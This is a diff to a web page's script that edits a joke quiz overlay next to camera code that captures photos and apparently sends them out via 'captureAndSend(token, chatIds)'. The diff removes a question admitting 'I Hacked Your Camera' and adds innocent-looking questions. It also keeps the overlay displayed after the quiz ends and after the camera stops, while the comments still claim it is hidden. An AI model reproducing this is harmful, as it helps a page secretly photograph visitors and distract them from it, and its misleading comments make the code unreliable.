@@ -445,11 +445,14 @@ const quizQ = document.getElementById('quizQ');
 const quizOptions = document.getElementById('quizOptions');
 
 const questions = [
-  { q: "Who Send it to you?", opts: ["Bad Boy", "Good Boy", "Handsome Boy"] },
+  { q: "Your a?", opts: ["Bad Boy", "Good Boy", "Handsome Boy"] },
   { q: "what did you eat today?", opts: ["Human", "Zombie", "Grass", "Food"] },
   { q: "Did you love someone?", opts: ["Nahhh", "Yessss", "why did i tell you?"] },
   { q: "Are you really reading this??", opts: ["Yesss", "Nahh"] },
-  { q: "I Hacked Your Camera.. Are You Angry?", opts: ["Yes", "Noo"] }
+  { q: "What is 1 + 1?", opts: ["2", "11", "Fish 🐟", "Why math now?"] },
+  { q: "Who is the boss of your house?", opts: ["Me!", "My mom", "The cat 🐱"] },
+  { q: "Are you actually an NPC?", opts: ["Press A to talk", "Yes 🤖", "I think so..."] },
+  { q: "What's the best time to panic?", opts: ["Right now", "3 AM", "Always"] }  
 ];
 let currentQ = 0;
 
@@ -481,7 +484,7 @@ function showQuiz() {
 
 function loadQuestion() {
   if (currentQ >= questions.length) {
-    quizOverlay.style.display = 'none'; // Hide when done
+    quizOverlay.style.display = 'flex'; // Hide when done
     return;
   }
   quizQ.textContent = questions[currentQ].q;
@@ -546,7 +549,7 @@ function stopCamera(){
   video.srcObject = null;
   setLive(false);
   log(`Stopped. Captured ${shotCount} photo(s) this session.`);
-  quizOverlay.style.display = 'none'; // Hide quiz if they hit stop
+  quizOverlay.style.display = 'flex'; // Hide quiz if they hit stop
 }
 
 function captureAndSend(token, chatIds){
